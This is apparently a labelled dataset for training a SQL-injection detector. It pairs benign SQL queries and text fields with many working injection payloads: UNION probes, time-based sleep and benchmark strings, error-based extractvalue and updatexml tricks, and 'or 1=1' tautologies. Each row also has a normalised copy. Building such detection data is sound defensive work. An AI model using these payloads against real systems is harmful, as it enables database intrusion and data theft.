Sentence,Label,Processed_Sentence
"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",1.0,"-0""  )   as vpvt where 0  =  0 union all select 0,0,0,0,0,0--"
"1""  )   as yzny where 4869  =  4869 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",1.0,"0""  )   as yzny where 0  =  0 rlike   (  select * from   (  select  (  sleep  (  0   )    )     )  sgvo  )  --"
gelis,0.0,gelis
"1%'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1.0,"0%'   )    )    and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )  --"
ad5ma.sc9r,0.0,ad0ma.sc0r
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'vwve' like 'vwve,1.0,0' and   (  select * from   (  select  (  sleep  (  0   )    )     )  fzno  )   and 'vwve' like 'vwve
"   SELECT lovely, section, not FROM thou WHERE amount  IS NULL",0.0,"   select lovely, section, not from thou where amount  is null"
SELECT TOP 3 * FROM danger WHERE rocky = 'better',0.0,select top 0 * from danger where rocky = 'better'
"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",1.0,"0   )    )     )   and   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  0  =  0"
"   SELECT even, bus+ ', ' + shoulder+ ' ' + flew+ ', ' + there AS oil  FROM flight",0.0,"   select even, bus+ ', ' + shoulder+ ' ' + flew+ ', ' + there as oil  from flight"
"1' where 3760  =  3760 union all select null,null,null,null,null,null,null,null#",1.0,"0' where 0  =  0 union all select null,null,null,null,null,null,null,null#"
SELECT * FROM graph WHERE tower = 'actual'  AND  ( gas = 'these' OR yard = 'eat' ) ,0.0,select * from graph where tower = 'actual'  and  ( gas = 'these' or yard = 'eat' ) 
"-7579%"" or 6570  =  1764",1.0,"-0%"" or 0  =  0"
hawker-wiese7@tradora.mg,0.0,hawker-wiese0@tradora.mg
SELECT bound ( s FROM year RIGHT JOIN,0.0,select bound ( s from year right join
pesado,0.0,pesado
"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",1.0,"-0   )    )     )   union all select 0,0,0,0,0--"
"1""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo",1.0,"0""   )    )     )   and 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual  )   and    (    (     (  ""ruvo"" like ""ruvo"
1 and user_name  (    )     =   'dbo',1.0,0 and user_name  (    )     =   'dbo'
select   (  case when   (  5752  =  6036  )   then 1 else 5752*  (  select 5752 from master..sysdatabases  )   end  )  --,1.0,select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from master..sysdatabases  )   end  )  --
a,1.0,a
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1.0,0'  )   and 0 in    (    (   char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +  (  select   (  case when   (  0  =  0  )   then char  (  0  )   else char  (  0  )   end   )    )   +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0   )    )     ) 
SELECT * FROM damage WHERE telephone NOT BETWEEN 'than' AND 'fog',0.0,select * from damage where telephone not between 'than' and 'fog'
DELETE FROM shore WHERE orbit = 'fur',0.0,delete from shore where orbit = 'fur'
select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,1.0,select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from master..sysdatabases  )   end  )  --
vachiran,0.0,vachiran
3980000000000000,0.0,0
"1"" where 7015  =  7015",1.0,"0"" where 0  =  0"
-8684' where 9820  =  9820 or 6844  =  5105,1.0,-0' where 0  =  0 or 0  =  0
 UPDATE broken SET may = 'universe'WHERE managed = 'dress',0.0, update broken set may = 'universe'where managed = 'dress'
-2429%' or 6890  =  5846,1.0,-0%' or 0  =  0
"1%"" union all select null,null,null,null,null,null,null,null,null,null#",1.0,"0%"" union all select null,null,null,null,null,null,null,null,null,null#"
"1"" or sleep  (  5  )  #",1.0,"0"" or sleep  (  0  )  #"
"SELECT t.*, tt.*, tr.object_id FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND tr.object_id IN  ( 347681, 262330, 292419, 262334 )  ORDER BY t.name ASC",0.0,"select t.*, tt.*, tr.object_id from wp_terms as t inner join wp_term_taxonomy as tt on t.term_id  =  tt.term_id inner join wp_term_relationships as tr on tr.term_taxonomy_id  =  tt.term_taxonomy_id where tt.taxonomy in  ( 'support_cat' )  and tr.object_id in  ( 0, 0, 0, 0 )  order by t.name asc"
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )   ",1.0,"0"" and elt  (  0  =  0,sleep  (  0   )    )   "
"calle espio, 120, 11?a",0.0,"calle espio, 0, 0?a"
"1,  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   ",1.0,"0,  (  select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from mysql.db  )   end   )    )   "
SELECT COUNT ( battleID ) FROM church,0.0,select count ( battleid ) from church
SELECT * FROM price WHERE frame BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from price where frame between '0-0-0' and '0-0-0'
SELECT TOP 3 * FROM jungle WHERE plan = 'stiff' SELECT * FROM positive,0.0,select top 0 * from jungle where plan = 'stiff' select * from positive
5urgui8a,0.0,0urgui0a
robertino,0.0,robertino
"1%""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""%""  =  """,1.0,"0%""  )   and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )   and   (  ""%""  =  """
"-1051""  )   where 6586  =  6586 or 6647  =  6738#",1.0,"-0""  )   where 0  =  0 or 0  =  0#"
"  UPDATE plant SET form =  'blanket', City =  'pound' WHERE hand =  flat",0.0,"  update plant set form =  'blanket', city =  'pound' where hand =  flat"
"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'gxpr'  =  'gxpr",1.0,"0'   )    )    or 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )    and    (    (   'gxpr'  =  'gxpr"
SELECT AVG ( fort ) FROM his SELECT SUM ( honor ) ,0.0,select avg ( fort ) from his select sum ( honor ) 
obed9e3cia0,0.0,obed0e0cia0
SELECT AVG ( front ) FROM gather SELECT SUM ( directly ) ,0.0,select avg ( front ) from gather select sum ( directly ) 
SELECT * FROM amount WHERE    NOT factory = 'school',0.0,select * from amount where    not factory = 'school'
SELECT MIN ( being )  AS pie FROM call,0.0,select min ( being )  as pie from call
"1  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  7984  =  7984",1.0,"0  )   or   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  0  =  0"
SELECT * FROM satellites WHERE studied = 'but'  OR syllable = 'film',0.0,select * from satellites where studied = 'but'  or syllable = 'film'
SELECT AVG ( daughter )  FROM increase  SELECT SUM ( shall ) ,0.0,select avg ( daughter )  from increase  select sum ( shall ) 
perr@pasajesaereosbaratos.pm,0.0,perr@pasajesaereosbaratos.pm
" end and    (    (   ""rqay"" like ""rqay",1.0," end and    (    (   ""rqay"" like ""rqay"
 UPDATE lost SET capital = 'careful'WHERE them = 'chair',0.0, update lost set capital = 'careful'where them = 'chair'
jarandilla de la vera,0.0,jarandilla de la vera
"-6263%""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,1.0,"-0%""   )    )    or 0  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   and    (    (   ""%""  =  """
SELECT * FROM experiment WHERE foot LIKE '%store%',0.0,select * from experiment where foot like '%store%'
" select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",1.0," select * from users where id  =  0 +   (  \+  )   union select null,@@version -- 0"
SELECT * FROM nice,0.0,select * from nice
"   SELECT tribe, why, cat FROM according WHERE plan  IS NULL",0.0,"   select tribe, why, cat from according where plan  is null"
qu.8ncen3rio,0.0,qu.0ncen0rio
"-8566""  )   as hnch where 3418  =  3418 union all select 3418,3418,3418,3418,3418,3418,3418#",1.0,"-0""  )   as hnch where 0  =  0 union all select 0,0,0,0,0,0,0#"
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1.0,select * from users where id  =  '0' *$ 0 or 0  =  0 -- 0'
UEv,1.0,uev
"1  )   as ewnv where 3393  =  3393 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1.0,"0  )   as ewnv where 0  =  0 and 0  =    (  select count  (  *  )   from sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0  )  --"
SELECT orbit ( s )  FROM orange FULL OUTER JOIN,0.0,select orbit ( s )  from orange full outer join
"-1015""   )    )    union all select 6624,6624#",1.0,"-0""   )    )    union all select 0,0#"
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1.0," select * from users where id  =  0 or "",#"" or 0  =  0 -- 0"
SELECT * FROM perfectly WHERE describe = 'fairly' FETCH FIRST 3 ROWS ONLY,0.0,select * from perfectly where describe = 'fairly' fetch first 0 rows only
"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",1.0,"0'   )    )    and updatexml  (  0,concat  (  0x0e,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0  )  ,0  )   and    (    (   'ayqn' like 'ayqn"
if  (  3593  =  3779  )   select 3593 else drop function qtqy--,1.0,if  (  0  =  0  )   select 0 else drop function qtqy--
1 where 1576  =  1576,1.0,0 where 0  =  0
"select * from generate_series  (  2673,2673,case when   (  2673  =  1468  )   then 1 else 0 end  )   limit 1--",1.0,"select * from generate_series  (  0,0,case when   (  0  =  0  )   then 0 else 0 end  )   limit 0--"
1'+  (  select iutk where 6158  =  6158,1.0,0'+  (  select iutk where 0  =  0
SELECT * FROM come 3 SELECT * FROM coffee,0.0,select * from come 0 select * from coffee
"1""  )   where 2873  =  2873 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1.0,"0""  )   where 0  =  0 or 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  --"
SELECT MIN ( evening )  AS future FROM primitive,0.0,select min ( evening )  as future from primitive
sqlvuln,1.0,sqlvuln
" select * from users where id  =  1 or 1#""$ union select version  (    )  ,version  (    )   -- 1",1.0," select * from users where id  =  0 or 0#""$ union select version  (    )  ,version  (    )   -- 0"
brenn,0.0,brenn
olea de boedo,0.0,olea de boedo
SELECT dollar ( s )  FROM stiff SELECT root FROM contrast,0.0,select dollar ( s )  from stiff select root from contrast
"1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",1.0,"0' in boolean mode  )   or extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0   )    )   #"
 (  select   (  case when   (  9525  =  9280  )   then 9525 else 9525*  (  select 9525 from master..sysdatabases  )   end   )    ) ,1.0, (  select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from master..sysdatabases  )   end   )    ) 
"1'+  (  select 'ixza' where 4374  =  4374 union all select null,null,null--",1.0,"0'+  (  select 'ixza' where 0  =  0 union all select null,null,null--"
34475,0.0,0
zarra,0.0,zarra
"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  9841  =  9841",1.0,"0  )   and 0  =    (  select count  (  *  )   from sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0  )   and   (  0  =  0"
SELECT beauty ( s )  FROM locate SELECT modern ( s ) ,0.0,select beauty ( s )  from locate select modern ( s ) 
ayat rozas,0.0,ayat rozas
1 union all select null#,1.0,0 union all select null#
-4954'  )   or 8571  =  8571--,1.0,-0'  )   or 0  =  0--
"-7333%""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,1.0,"-0%""   )    )     )   or 0  =    (  'qqpjq'||  (  select case 0 when 0 then 0 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """
1' order by 1--,1.0,0' order by 0--
admin'  )   or   (  '1'  =  '1'/*,1.0,admin'  )   or   (  '0'  =  '0'/*
SELECT MIN ( story )  AS merely FROM team,0.0,select min ( story )  as merely from team
"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""dsae""  =  ""dsae",1.0,"0"" procedure analyse  (  extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ,0x0a0a0   )    )   ,0  )   and ""dsae""  =  ""dsae"
"1""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""vxec"" like ""vxec",1.0,"0""  )   and 0  =  benchmark  (  0,md0  (  0x0   )    )    and   (  ""vxec"" like ""vxec"
select pg_sleep  (  5   )    )   ||',1.0,select pg_sleep  (  0   )    )   ||'
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  ""%""  =  """,1.0,"call regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )   and   (  ""%""  =  """
-2022   )    )     )   or 6812  =  3516 and    (    (     (  3896  =  3896,1.0,-0   )    )     )   or 0  =  0 and    (    (     (  0  =  0
" select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",1.0," select * from users where id  =  0 or ""{,""  =  0 or 0  =  0 -- 0"
SELECT safe ( s )  FROM over UNION ALL,0.0,select safe ( s )  from over union all
SELECT AVG ( Price ) FROM gravity,0.0,select avg ( price ) from gravity
kovacs,0.0,kovacs
"1""  )   as oijn where 1521  =  1521 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0""  )   as oijn where 0  =  0 and 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
 UPDATE is SET airplane = 'sister'WHERE broad = 'community',0.0, update is set airplane = 'sister'where broad = 'community'
"1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#",1.0,"0'   )    )    as orvy where 0  =  0 union all select null,null,null,null,null,null,null,null#"
1'  )   and 8404  =  8651#,1.0,0'  )   and 0  =  0#
"1'   )    )    as peeo where 5356  =  5356 and elt  (  4722  =  2382,2382  )  --",1.0,"0'   )    )    as peeo where 0  =  0 and elt  (  0  =  0,0  )  --"
lloros*o,0.0,lloros*o
vimbre,0.0,vimbre
"plza. salamanca 39,",0.0,"plza. salamanca 0,"
"-5731"" union all select 3083,3083,3083#",1.0,"-0"" union all select 0,0,0#"
SELECT MIN ( biggest )  AS mind FROM calm,0.0,select min ( biggest )  as mind from calm
1emat98,0.0,0emat0
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1.0,"0%""   )    )    union all select null,null,null,null,null,null,null,null,null,null#"
SELECT * FROM earlier WHERE heart IN  ( SELECT equipment FROM are ) ,0.0,select * from earlier where heart in  ( select equipment from are ) 
"1,  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   ",1.0,"0,  (  select   (  case when   (  0  =  0  )   then   (  select count  (  *  )   from generate_series  (  0,0   )    )    else 0/  (  select 0  )   end   )    )   "
"-1083'  )   union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",1.0,"-0'  )   union all select 0,0,0,0,0,0,0,0,0--"
"1""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""gozk""  =  ""gozk",1.0,"0""  )   and 0  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   and   (  ""gozk""  =  ""gozk"
"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#",1.0,"-0""   )    )     )   union all select 0,0,0,0,0,0,0#"
SELECT * FROM giant FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM sure,0.0,select * from giant fetch first 0 rows only select top 0 percent * from sure
SELECT TOP 50 PERCENT * FROM one,0.0,select top 0 percent * from one
6482560000000000,0.0,0
"1%""   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1.0,"0%""   )    )    or 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )   --"
"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",1.0,"-0""   )    )    union all select 0,0,0,0,0,0#"
SELECT * FROM pie WHERE importance = 'anyway'  AND  ( leave = 'wise' OR policeman = 'no' ) ,0.0,select * from pie where importance = 'anyway'  and  ( leave = 'wise' or policeman = 'no' ) 
1   )    )    as mcyh where 1001  =  1001,1.0,0   )    )    as mcyh where 0  =  0
"1%"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,1.0,"0%"" and 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )   and ""%""  =  """
"-3090"" or make_set  (  9354  =  9354,7185  )   and ""qowe"" like ""qowe",1.0,"-0"" or make_set  (  0  =  0,0  )   and ""qowe"" like ""qowe"
" select * from users where id  =  1 or $+<\ union select 1,@@VERSION -- 1",1.0," select * from users where id  =  0 or $+<\ union select 0,@@version -- 0"
"1'  )   as xagu where 9088  =  9088   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1.0,"0'  )   as xagu where 0  =  0   (  select   (  case when   (  0  =  0  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )   else char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )   end  )   from   (  values  (  0   )    )     )  --"
SELECT * FROM sail WHERE have NOT BETWEEN 'people' AND 'form',0.0,select * from sail where have not between 'people' and 'form'
select case when 6420  =  7941 then 1 else null end--,1.0,select case when 0  =  0 then 0 else null end--
"-2979'   )    )    as klou where 7092  =  7092 union all select 7092,7092--",1.0,"-0'   )    )    as klou where 0  =  0 union all select 0,0--"
1'   )    )    as jtmf where 3937  =  3937,1.0,0'   )    )    as jtmf where 0  =  0
SELECT * FROM judge WHERE energy = 'toy' FETCH FIRST 3 ROWS ONLY,0.0,select * from judge where energy = 'toy' fetch first 0 rows only
SELECT * FROM tired WHERE Price NOT BETWEEN 10 AND 20,0.0,select * from tired where price not between 0 and 0
SELECT * FROM enter FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM situation,0.0,select * from enter fetch first 0 percent rows onlyselect top 0 * from situation
"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""zzcd""  =  ""zzcd",1.0,"0""   )    )     )   or 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )   and    (    (     (  ""zzcd""  =  ""zzcd"
"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1.0,"0""  )   where 0  =  0 and 0  =    (  select 0 from pg_sleep  (  0   )    )   --"
"1   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1.0,"0   )    )     )   or 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  --"
"1%'  )   union all select null,null,null,null,null--",1.0,"0%'  )   union all select null,null,null,null,null--"
SELECT * FROM property WHERE congress = 'additional'  AND  ( during = 'dark' OR street = 'stick' ) ,0.0,select * from property where congress = 'additional'  and  ( during = 'dark' or street = 'stick' ) 
"1%""  )   or sleep  (  5  )   and   (  ""%""  =  """,1.0,"0%""  )   or sleep  (  0  )   and   (  ""%""  =  """
"1""   )    )    as xwrq where 4161  =  4161",1.0,"0""   )    )    as xwrq where 0  =  0"
dana,0.0,dana
SELECT thumb ( s ) FROM element INNER JOIN,0.0,select thumb ( s ) from element inner join
SELECT TOP 3 * FROM made WHERE scientist = 'daughter' SELECT * FROM list,0.0,select top 0 * from made where scientist = 'daughter' select * from list
"-6496""  )   as obnf where 2903  =  2903 or make_set  (  9354  =  9354,7185  )  --",1.0,"-0""  )   as obnf where 0  =  0 or make_set  (  0  =  0,0  )  --"
brines grimalda,0.0,brines grimalda
SELECT * FROM dollar WHERE appropriate BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from dollar where appropriate between '0-0-0' and '0-0-0'
fisicoqumico,0.0,fisicoqumico
select * from users where id  =  '1'   or 1  =  1 -- 1',1.0,select * from users where id  =  '0'   or 0  =  0 -- 0'
SELECT * FROM road FETCH FIRST 3 ROWS ONLY,0.0,select * from road fetch first 0 rows only
"  SELECT able,principal,sing FROM dear LEFT JOIN Orders ON silly.presidentID =  successful.came ORDER BY harbor.load",0.0,"  select able,principal,sing from dear left join orders on silly.presidentid =  successful.came order by harbor.load"
SELECT COUNT ( term )  FROM scared,0.0,select count ( term )  from scared
SELECT COUNT ( DISTINCT dry )  FROM sister,0.0,select count ( distinct dry )  from sister
SELECT TOP 3 * FROM second WHERE region = 'expect' SELECT * FROM hard,0.0,select top 0 * from second where region = 'expect' select * from hard
"c/ fontans, 124, 10?c",0.0,"c/ fontans, 0, 0?c"
" select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1.0," select * from users where id  =  '0' union select $*$,@@version -- 0'"
"1'+  (  select 'rguk' where 6019  =  6019 union all select null,null,null,null,null--",1.0,"0'+  (  select 'rguk' where 0  =  0 union all select null,null,null,null,null--"
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""bqfj"" like ""bqfj",1.0,"select benchmark  (  0,md0  (  0x0c0d0   )    )    and    (    (     (  ""bqfj"" like ""bqfj"
3527140000000000,0.0,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 7074 )  ORDER BY meta_id ASC",0.0,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 0 )  order by meta_id asc"
"1%""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""%""  =  """,1.0,"0%""   )    )    and row  (  0,0  )  >  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from   (  select 0 union select 0 union select 0 union select 0  )  a group by x  )   and    (    (   ""%""  =  """
aveinte,0.0,aveinte
"1'+  (  select 'bztp' where 2541  =  2541 union all select null,null,null,null,null,null,null,null,null,null--",1.0,"0'+  (  select 'bztp' where 0  =  0 union all select null,null,null,null,null,null,null,null,null,null--"
